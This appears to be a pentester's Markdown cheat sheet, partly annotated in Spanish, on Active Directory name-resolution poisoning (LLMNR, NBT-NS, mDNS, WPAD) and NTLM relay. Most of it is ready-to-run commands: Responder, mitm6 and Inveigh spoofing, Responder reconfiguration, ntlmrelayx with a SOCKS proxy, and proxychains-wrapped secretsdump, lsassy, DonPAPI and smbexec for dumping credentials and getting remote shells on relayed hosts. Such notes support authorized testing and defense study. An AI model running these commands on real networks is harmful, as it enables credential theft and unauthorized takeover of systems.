## Poisoning and Relay

### Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD

#### Linux

[mitm6](https://github.com/dirkjanm/mitm6)
[Responder](https://github.com/lgandx/Responder)

```bash
sudo responder -I tun0
mitm6 
```
#### Windows

[Inveigh](https://github.com/Kevin-Robertson/Inveigh)

```powershell
.\Inveigh.exe
```

### Relay Attacks

>Note that the relayed authentication must be from a user which has Local Admin access to the relayed host and SMB signing must be disabled.

#### Enumerate Unsigned SMB

> signing:False

```bash
crackmapexec smb scope.txt --gen-relay-list relay.txt
```

Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.

```bash
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
#Revert process
sed -i 's/HTTP = Off/HTTP = On/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = Off/SMB = On/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
```

Start ntlmrelay

- `-tf` : list of targets to relay the authentication
- `-of` : output file, this will keep the captured smb hashes just like we did before with responder, to crack them later
- `-smb2support` : support for smb2
- `-socks` : will start a socks proxy to use relayed authentication

> Si tengo smb relay no puedo utilizarla en otro protocolo que no sea SMB

```bash
#Install proxychains
sudo apt install proxychains
#Configure /etc/proxychains.conf and add this line
socks4  127.0.0.1 1080
# Start attack
sudo python3 ntlmrelayx.py -tf relay.txt -of netntlm -smb2support -socks
# User obtained
# [*] SMBD-Thread-97: Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, but there are no more targets left!
proxychains python3 secretsdump.py -no-pass 'DOMAIN'/'USER'@'IP'
proxychains lsassy --no-pass -d DOMAIN -u userobtained $ip
proxychains DonPAPI -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -credz creds_robb.txt
proxychains crackmapexec smb $ip -d DOMAINnotdotcom -u username -p password --sam #password could be anything
proxychains python3 smbclient.py -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -debug
proxychains python3 smbexec.py -no-pass 'DOMAINnotdotcom'/'username'@'$ip' -debug
```

#### Mitm6 + ntlmrelayx to ldap (Pendiente)